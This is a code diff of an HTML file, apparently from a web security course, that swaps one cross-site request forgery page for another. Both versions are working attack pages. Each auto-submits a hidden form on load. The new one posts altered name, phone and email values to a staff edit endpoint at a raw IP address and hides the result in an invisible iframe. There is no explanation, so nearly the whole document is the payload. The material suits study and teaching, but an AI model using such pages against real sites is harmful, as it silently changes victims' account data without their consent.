@@ -1,6 +1,14 @@
- <form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
-	<input type="hidden" name="userId" value="88d493a99ccac850c36f08299797e6425f0e09a4" />
-	<input type="submit"/>
-</form>
-<script> document.csrfForm.submit(); </script>
-
+<html>
+  <head>
+    <title>Form</title>
+  </head>
+  <body onload="document.my_form.submit()">
+    <form action="https://35.184.199.7/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="Anirudh" />
+      <input type="text" name="last_name" value="KC" />
+      <input type="text" name="phone" value="777-777-7777" />
+      <input type="text" name="email" value="kc@gmail.com" />
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html>
